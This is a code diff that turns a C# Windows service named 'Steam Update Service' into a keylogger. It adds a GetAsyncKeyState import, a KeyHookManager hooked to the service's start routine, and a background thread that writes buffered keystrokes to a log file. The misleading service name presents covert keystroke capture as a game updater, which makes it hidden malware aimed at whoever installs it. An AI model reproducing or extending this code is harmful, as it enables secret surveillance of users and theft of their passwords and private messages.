@@ -4,6 +4,11 @@ using System.ServiceProcess;
 using System.Reflection;
 using System.Configuration.Install;
 using System.Linq;
+using System.Threading;
+using System.Collections;
+using System.Collections.Generic;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 [assembly: log4net.Config.XmlConfigurator(Watch = true)]
 
@@ -11,9 +16,18 @@ namespace WindowsService
 {
     class WindowsService : ServiceBase
     {
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern short GetAsyncKeyState(int vKey);
+
 
         public static readonly string Name = "Steam Update Service";
         private static readonly log4net.ILog log = log4net.LogManager.GetLogger(typeof(WindowsService));
+
+        private Thread thread;
+        private static KeyHookManager keyhookMgr;
+        private static Queue keystrokeBuf;
+        private static bool awaitingMsg;
+
         /// <summary>
         /// Public Constructor for WindowsService.
         /// - Put all of your Initialization code here.
@@ -62,6 +76,33 @@ namespace WindowsService
             }
         }
 
+        public static void PushMessage(string msg)
+        {
+            lock (keystrokeBuf.SyncRoot)
+            {
+                keystrokeBuf.Enqueue(msg);
+            }
+            awaitingMsg = true;
+        }
+
+        private static void Update()
+        {
+            while (true)
+            {
+                if (awaitingMsg == true)
+                {
+                    lock (keystrokeBuf.SyncRoot)
+                    {
+                        while (keystrokeBuf.Count > 0)
+                        {
+                            log.Info(keystrokeBuf.Dequeue());
+                        }
+                        awaitingMsg = false;
+                    }
+                }
+            }
+        }
+
         /// <summary>
         /// Dispose of objects that need it here.
         /// </summary>
@@ -69,6 +110,7 @@ namespace WindowsService
         ///    or not disposing is going on.</param>
         protected override void Dispose(bool disposing)
         {
+            keyhookMgr.Dispose();
             base.Dispose(disposing);
         }
 
@@ -80,6 +122,14 @@ namespace WindowsService
         protected override void OnStart(string[] args)
         {
             log.Info("Started service.");
+
+            awaitingMsg = false;
+            keystrokeBuf = new Queue();
+            keyhookMgr = new KeyHookManager(PushMessage);
+
+            thread = new Thread(new ThreadStart(Update));
+            thread.Start();
+
             base.OnStart(args);
         }
 
@@ -90,6 +140,9 @@ namespace WindowsService
         protected override void OnStop()
         {
             log.Info("Stopped service.");
+
+            thread.Join(50);
+
             base.OnStop();
         }
 
